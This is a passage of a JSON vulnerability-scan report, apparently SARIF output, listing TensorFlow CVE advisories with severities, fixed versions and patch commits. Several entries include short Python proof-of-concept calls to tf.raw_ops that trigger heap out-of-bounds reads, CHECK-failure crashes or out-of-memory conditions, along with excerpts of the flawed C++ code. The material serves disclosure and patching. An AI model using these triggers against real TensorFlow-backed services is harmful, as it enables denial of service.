                "markdown": "**Vulnerability CVE-2022-21726**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21726](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21726)|\n\n### Impact \nThe [implementation of `Dequantize`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/dequantize_op.cc#L92-L153) does not fully validate the value of `axis` and can result in heap OOB accesses:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.Dequantize(\n    input=tf.constant([1,1],dtype=tf.qint32),\n    min_range=[1.0],\n    max_range=[10.0],\n    mode=`MIN_COMBINED`,\n    narrow_range=False,\n    axis=2**31-1,\n    dtype=tf.bfloat16)\n  return y\n\ntest()\n```\n\nThe `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked and this results in reading past the end of the array containing the dimensions of the input tensor:\n    \n```cc   \n  if (axis_ \u003e -1) {\n    num_slices = input.dim_size(axis_);\n  }\n  // ...\n  int64_t pre_dim = 1, post_dim = 1;\n  for (int i = 0; i \u003c axis_; ++i) {\n    pre_dim *= float_output.dim_size(i);\n  }\n  for (int i = axis_ + 1; i \u003c float_output.dims(); ++i) {\n    post_dim *= float_output.dim_size(i);\n  }\n``` \n      \n### Patches\nWe have patched the issue in GitHub commit [23968a8bf65b009120c43b5ebcceaf52dbc9e943](https://github.com/tensorflow/tensorflow/commit/23968a8bf65b009120c43b5ebcceaf52dbc9e943).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n      \n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "8.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23573",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23573"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23573",
              "help": {
                "text": "Vulnerability CVE-2022-23573\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23573](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23573)\n### Impact\nThe [implementation of `AssignOp`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/assign_op.h#L30-L143) can result in copying unitialized data to a new tensor. This later results in undefined behavior.\n\nThe implementation has a check that the left hand side of the assignment is initialized (to minimize number of allocations), but does not check that the right hand side is also initialized.\n  \n### Patches\nWe have patched the issue in GitHub commit [ef1d027be116f25e25bb94a60da491c2cf55bd0b](https://github.com/tensorflow/tensorflow/commit/ef1d027be116f25e25bb94a60da491c2cf55bd0b).\n    \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n",
                "markdown": "**Vulnerability CVE-2022-23573**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23573](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23573)|\n\n### Impact\nThe [implementation of `AssignOp`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/assign_op.h#L30-L143) can result in copying unitialized data to a new tensor. This later results in undefined behavior.\n\nThe implementation has a check that the left hand side of the assignment is initialized (to minimize number of allocations), but does not check that the right hand side is also initialized.\n  \n### Patches\nWe have patched the issue in GitHub commit [ef1d027be116f25e25bb94a60da491c2cf55bd0b](https://github.com/tensorflow/tensorflow/commit/ef1d027be116f25e25bb94a60da491c2cf55bd0b).\n    \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n"
              },
              "properties": {
                "security-severity": "7.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23575",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23575"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23575",
              "help": {
                "text": "Vulnerability CVE-2022-23575\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23575](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23575)\n### Impact\nThe [implementation of `OpLevelCostEstimator::CalculateTensorSize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L1552-L1558) is vulnerable to an integer overflow if an attacker can create an operation which would involve a tensor with large enough number of elements:\n```cc\nint64_t OpLevelCostEstimator::CalculateTensorSize(\n    const OpInfo::TensorProperties\u0026 tensor, bool* found_unknown_shapes) {\n  int64_t count = CalculateTensorElementCount(tensor, found_unknown_shapes);\n  int size = DataTypeSize(BaseType(tensor.dtype()));\n  VLOG(2) \u003c\u003c \"Count: \" \u003c\u003c count \u003c\u003c \" DataTypeSize: \" \u003c\u003c size;\n  return count * size;\n}\n```\nHere, `count` and `size` can be large enough to cause `count * size` to overflow.\n\n### Patches\nWe have patched the issue in GitHub commit [fcd18ce3101f245b083b30655c27b239dc72221e](https://github.com/tensorflow/tensorflow/commit/fcd18ce3101f245b083b30655c27b239dc72221e).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23575**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23575](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23575)|\n\n### Impact\nThe [implementation of `OpLevelCostEstimator::CalculateTensorSize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L1552-L1558) is vulnerable to an integer overflow if an attacker can create an operation which would involve a tensor with large enough number of elements:\n```cc\nint64_t OpLevelCostEstimator::CalculateTensorSize(\n    const OpInfo::TensorProperties\u0026 tensor, bool* found_unknown_shapes) {\n  int64_t count = CalculateTensorElementCount(tensor, found_unknown_shapes);\n  int size = DataTypeSize(BaseType(tensor.dtype()));\n  VLOG(2) \u003c\u003c \"Count: \" \u003c\u003c count \u003c\u003c \" DataTypeSize: \" \u003c\u003c size;\n  return count * size;\n}\n```\nHere, `count` and `size` can be large enough to cause `count * size` to overflow.\n\n### Patches\nWe have patched the issue in GitHub commit [fcd18ce3101f245b083b30655c27b239dc72221e](https://github.com/tensorflow/tensorflow/commit/fcd18ce3101f245b083b30655c27b239dc72221e).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23586",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23586"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23586",
              "help": {
                "text": "Vulnerability CVE-2022-23586\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-23586](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23586)\n### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [assertions in `function.cc`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/function.cc) would be falsified and crash the Python interpreter.\n### Patches\nWe have patched the issue in GitHub commits [dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2](https://github.com/tensorflow/tensorflow/commit/dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2) and [3d89911481ba6ebe8c88c1c0b595412121e6c645](https://github.com/tensorflow/tensorflow/commit/3d89911481ba6ebe8c88c1c0b595412121e6c645).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23586**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-23586](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23586)|\n\n### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [assertions in `function.cc`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/function.cc) would be falsified and crash the Python interpreter.\n### Patches\nWe have patched the issue in GitHub commits [dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2](https://github.com/tensorflow/tensorflow/commit/dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2) and [3d89911481ba6ebe8c88c1c0b595412121e6c645](https://github.com/tensorflow/tensorflow/commit/3d89911481ba6ebe8c88c1c0b595412121e6c645).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "GHSA-43q8-3fv7-pr5x",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "GHSA-43q8-3fv7-pr5x"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://github.com/advisories/GHSA-43q8-3fv7-pr5x",
              "help": {
                "text": "Vulnerability GHSA-43q8-3fv7-pr5x\nSeverity: high\nFixed Version: 2.7.0\nLink: [GHSA-43q8-3fv7-pr5x](https://github.com/advisories/GHSA-43q8-3fv7-pr5x)\n### Impact\nThe implementation of [`tf.sparse.split`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_split_op.cc#L26-L102) does not fully validate the input arguments. Hence, a malicious user can trigger a denial of service via a segfault or a heap OOB read:\n\n```python\nimport tensorflow as tf\ndata = tf.random.uniform([1, 32, 32], dtype=tf.float32)\naxis = [1, 2]\nx = tf.sparse.from_dense(data)\nresult = tf.sparse.split(x,3, axis=axis)\n```\nThe code assumes `axis` is a scalar. This is another instance of [TFSA-2021-190](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-190.md) (CVE-2021-41206).\n\n### Patches\nWe have patched the issue in GitHub commit [61bf91e768173b001d56923600b40d9a95a04ad5](https://github.com/tensorflow/tensorflow/commit/61bf91e768173b001d56923600b40d9a95a04ad5) (merging [#53695](https://github.com/tensorflow/tensorflow/pull/53695)).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/53660).",
                "markdown": "**Vulnerability GHSA-43q8-3fv7-pr5x**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[GHSA-43q8-3fv7-pr5x](https://github.com/advisories/GHSA-43q8-3fv7-pr5x)|\n\n### Impact\nThe implementation of [`tf.sparse.split`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_split_op.cc#L26-L102) does not fully validate the input arguments. Hence, a malicious user can trigger a denial of service via a segfault or a heap OOB read:\n\n```python\nimport tensorflow as tf\ndata = tf.random.uniform([1, 32, 32], dtype=tf.float32)\naxis = [1, 2]\nx = tf.sparse.from_dense(data)\nresult = tf.sparse.split(x,3, axis=axis)\n```\nThe code assumes `axis` is a scalar. This is another instance of [TFSA-2021-190](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-190.md) (CVE-2021-41206).\n\n### Patches\nWe have patched the issue in GitHub commit [61bf91e768173b001d56923600b40d9a95a04ad5](https://github.com/tensorflow/tensorflow/commit/61bf91e768173b001d56923600b40d9a95a04ad5) (merging [#53695](https://github.com/tensorflow/tensorflow/pull/53695)).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/53660)."
              },
              "properties": {
                "security-severity": "8.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23595",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23595"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23595",
              "help": {
                "text": "Vulnerability CVE-2022-23595\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-23595](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23595)\n### Impact\nWhen [building an XLA compilation cache](https://github.com/tensorflow/tensorflow/blob/274df9b02330b790aa8de1cee164b70f72b9b244/tensorflow/compiler/jit/xla_platform_info.cc#L43-L104), if default settings are used, TensorFlow triggers a null pointer dereference:\n\n```cc \n  string allowed_gpus =\n      flr-\u003econfig_proto()-\u003egpu_options().visible_device_list();\n``` \n    \nIn the default scenario, all devices are allowed, so `flr-\u003econfig_proto` is `nullptr`.\n    \n### Patches\nWe have patched the issue in GitHub commit [e21af685e1828f7ca65038307df5cc06de4479e8](https://github.com/tensorflow/tensorflow/commit/e21af685e1828f7ca65038307df5cc06de4479e8).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23595**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-23595](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23595)|\n\n### Impact\nWhen [building an XLA compilation cache](https://github.com/tensorflow/tensorflow/blob/274df9b02330b790aa8de1cee164b70f72b9b244/tensorflow/compiler/jit/xla_platform_info.cc#L43-L104), if default settings are used, TensorFlow triggers a null pointer dereference:\n\n```cc \n  string allowed_gpus =\n      flr-\u003econfig_proto()-\u003egpu_options().visible_device_list();\n``` \n    \nIn the default scenario, all devices are allowed, so `flr-\u003econfig_proto` is `nullptr`.\n    \n### Patches\nWe have patched the issue in GitHub commit [e21af685e1828f7ca65038307df5cc06de4479e8](https://github.com/tensorflow/tensorflow/commit/e21af685e1828f7ca65038307df5cc06de4479e8).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "5.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-21733",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21733"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21733",
              "help": {
                "text": "Vulnerability CVE-2022-21733\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-21733](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21733)\n### Impact \nThe [implementation of `StringNGrams`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/string_ngrams_op.cc#L29-L161) can be used to trigger a denial of service attack by causing an OOM condition after an integer overflow:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.StringNGrams(\n  data=[`123456`],\n  data_splits=[0,1],\n  separator=`a`*15,\n  ngram_widths=[],\n  left_pad=``,\n  right_pad=``,\n  pad_width=-5, \n  preserve_short_sequences=True)\n```\n\nWe are missing a validation on `pad_witdh` and that result in computing a negative value for `ngram_width` which is later used to allocate parts of the output.\n\n### Patches\nWe have patched the issue in GitHub commit [f68fdab93fb7f4ddb4eb438c8fe052753c9413e8](https://github.com/tensorflow/tensorflow/commit/f68fdab93fb7f4ddb4eb438c8fe052753c9413e8).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-21733**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-21733](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21733)|\n\n### Impact \nThe [implementation of `StringNGrams`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/string_ngrams_op.cc#L29-L161) can be used to trigger a denial of service attack by causing an OOM condition after an integer overflow:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.StringNGrams(\n  data=[`123456`],\n  data_splits=[0,1],\n  separator=`a`*15,\n  ngram_widths=[],\n  left_pad=``,\n  right_pad=``,\n  pad_width=-5, \n  preserve_short_sequences=True)\n```\n\nWe are missing a validation on `pad_witdh` and that result in computing a negative value for `ngram_width` which is later used to allocate parts of the output.\n\n### Patches\nWe have patched the issue in GitHub commit [f68fdab93fb7f4ddb4eb438c8fe052753c9413e8](https://github.com/tensorflow/tensorflow/commit/f68fdab93fb7f4ddb4eb438c8fe052753c9413e8).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "4.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29196",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29196"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29196",
              "help": {
                "text": "Vulnerability CVE-2022-29196\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29196](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29196)\n### Impact\nThe implementation of [`tf.raw_ops.Conv3DBackpropFilterV2`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/conv_grad_ops_3d.cc) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Conv3DBackpropFilterV2(\n  input=tf.constant(.5053710941, shape=[2,2,2,2,1], dtype=tf.float16),\n  filter_sizes=tf.constant(0, shape=[], dtype=tf.int32),\n  out_backprop=tf.constant(.5053710941, shape=[2,2,2,2,1], dtype=tf.float16),\n  strides=[1, 1, 1, 1, 1],\n  padding=\"VALID\",\n  data_format=\"NDHWC\",\n  dilations=[1, 1, 1, 1, 1])\n```\n  \nThe code does not validate that the `filter_sizes` argument is a vector.\n  \n### Patches\nWe have patched the issue in GitHub commit [174c5096f303d5be7ed2ca2662b08371bff4ab88](https://github.com/tensorflow/tensorflow/commit/174c5096f303d5be7ed2ca2662b08371bff4ab88).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n    \n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
                "markdown": "**Vulnerability CVE-2022-29196**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29196](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29196)|\n\n### Impact\nThe implementation of [`tf.raw_ops.Conv3DBackpropFilterV2`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/conv_grad_ops_3d.cc) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Conv3DBackpropFilterV2(\n  input=tf.constant(.5053710941, shape=[2,2,2,2,1], dtype=tf.float16),\n  filter_sizes=tf.constant(0, shape=[], dtype=tf.int32),\n  out_backprop=tf.constant(.5053710941, shape=[2,2,2,2,1], dtype=tf.float16),\n  strides=[1, 1, 1, 1, 1],\n  padding=\"VALID\",\n  data_format=\"NDHWC\",\n  dilations=[1, 1, 1, 1, 1])\n```\n  \nThe code does not validate that the `filter_sizes` argument is a vector.\n  \n### Patches\nWe have patched the issue in GitHub commit [174c5096f303d5be7ed2ca2662b08371bff4ab88](https://github.com/tensorflow/tensorflow/commit/174c5096f303d5be7ed2ca2662b08371bff4ab88).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n    \n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29207",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29207"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29207",
              "help": {
                "text": "Vulnerability CVE-2022-29207\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29207](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29207)\n### Impact\nMultiple TensorFlow operations misbehave in eager mode when the resource handle provided to them is invalid:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QueueIsClosedV2(handle=[])\n```\n\n```python\nimport tensorflow as tf\n\ntf.summary.flush(writer=())\n```\n  \nIn graph mode, it would have been impossible to perform these API calls, but migration to TF 2.x eager mode opened up this vulnerability. If the resource handle is empty, then a reference is bound to a null pointer inside TensorFlow codebase (various codepaths). This is undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [a5b89cd68c02329d793356bda85d079e9e69b4e7](https://github.com/tensorflow/tensorflow/commit/a5b89cd68c02329d793356bda85d079e9e69b4e7) and GitHub commit [dbdd98c37bc25249e8f288bd30d01e118a7b4498](https://github.com/tensorflow/tensorflow/commit/dbdd98c37bc25249e8f288bd30d01e118a7b4498).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Hong Jin from Singapore Management University.",
                "markdown": "**Vulnerability CVE-2022-29207**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29207](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29207)|\n\n### Impact\nMultiple TensorFlow operations misbehave in eager mode when the resource handle provided to them is invalid:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QueueIsClosedV2(handle=[])\n```\n\n```python\nimport tensorflow as tf\n\ntf.summary.flush(writer=())\n```\n  \nIn graph mode, it would have been impossible to perform these API calls, but migration to TF 2.x eager mode opened up this vulnerability. If the resource handle is empty, then a reference is bound to a null pointer inside TensorFlow codebase (various codepaths). This is undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [a5b89cd68c02329d793356bda85d079e9e69b4e7](https://github.com/tensorflow/tensorflow/commit/a5b89cd68c02329d793356bda85d079e9e69b4e7) and GitHub commit [dbdd98c37bc25249e8f288bd30d01e118a7b4498](https://github.com/tensorflow/tensorflow/commit/dbdd98c37bc25249e8f288bd30d01e118a7b4498).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Hong Jin from Singapore Management University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29209",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29209"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29209",
              "help": {
                "text": "Vulnerability CVE-2022-29209\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29209)\n### Impact\nThe [macros that TensorFlow uses for writing assertions (e.g., `CHECK_LT`, `CHECK_GT`, etc.)](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/platform/default/logging.h) have an incorrect logic when comparing `size_t` and `int` values. Due to type conversion rules, several of the macros would trigger incorrectly.\n\n### Patches\nWe have patched the issue in GitHub commit [b917181c29b50cb83399ba41f4d938dc369109a1](https://github.com/tensorflow/tensorflow/commit/b917181c29b50cb83399ba41f4d938dc369109a1) (merging GitHub PR [#55730](https://github.com/tensorflow/tensorflow/pull/55730)).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55530).",
